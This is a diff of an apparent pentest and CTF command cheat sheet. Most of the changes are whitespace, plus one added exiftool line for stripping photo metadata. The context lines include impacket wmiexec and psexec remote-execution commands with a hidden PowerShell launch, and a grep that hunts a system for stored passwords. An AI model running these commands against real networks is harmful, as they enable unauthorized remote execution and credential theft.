@@ -192,20 +192,21 @@ mysql -u root -p
   flush privileges;
 
 
+
 mount -v -o offset=123456 -t ext4 ctf-image.img mountpoint/
-
-
 mount -t cifs //fileserver/c$/ /media/folder/ -o username=fileserver/user1  # Mount a cifs share locally
-
 
 nfspysh -o server=192.168.1.2:/
 showmount -e 192.168.1.2    
+
+
 
 git clone https://github.com/CoreSecurity/impacket
 cd impacket/
 python examples/wmiexec.py 192.168.1.1 DOMAIN/user:P@ssw0rd
 python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd net use
 python examples/psexec.py -target-ip 192.168.1.2 DOMAIN/user:P@ssw0rd "powershell.exe -w hidden" # Rest of attack string goes here
+
 
 find . -type f -exec grep -i -I password {} /dev/null \;  # Hunt a system for passwords stored in scripts
 
@@ -276,3 +277,7 @@ sed -i '/^$/N;/\n$/N;//D' notes.txt # Compress consecutive blank lines down to j
 
 awk '{print $1}' data.txt # Print out just the first column (whitespace separated) of data.txt
 awk '{print $7}' access_log | sort | uniq -c | sort -rn | head -100 # Display top 100 files accessed on website.
+
+exiftool -all= photo.jpg # Remove all the exif metadata tags from photo.jpg to improve privacy before uploading.
+
+
